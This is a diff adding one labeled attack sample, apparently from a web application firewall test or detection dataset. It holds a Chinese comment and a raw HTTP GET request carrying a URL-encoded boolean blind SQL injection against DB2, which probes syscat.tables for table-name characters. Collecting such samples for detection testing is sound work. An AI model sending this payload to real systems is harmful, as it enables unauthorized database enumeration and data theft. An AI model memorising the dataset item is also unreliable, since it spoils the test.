@@ -1,0 +1,9 @@
+# SQL注入_GET_db2_布尔注入-06506482
+# 基于布尔注入，该SQL注入语句中："1 and (select ascii(substr(tabname ,1,1)) from syscat.tables where tabschema=current schema fetch first 1 rows only)>0"，攻击目的是探测当前数据库中的表名，并获取第一个表名的第一个字符的ASCII值，同时确认该ASCII值是否大于0。攻击者的目的是获取关于数据库结构的信息，这可能是为了发现潜在的漏洞、查找敏感数据、执行进一步的攻击或者破坏目标系统的安全性。
+GET /?id=1%20and%20%28select%20ascii%28substr%28tabname%20%2C1%2C1%29%29%20from%20syscat.tables%20where%20tabschema=current%20schema%20fetch%20first%201%20rows%20only%20%29%3E0&bid=hd_tag_m8mv26kx HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv26kx
+RM-PRO-Token: 0fd095acba65047df4123303214d73af
+RM-PRO-Time: 1742808628714
+User-Agent: curl/7.83.1
+
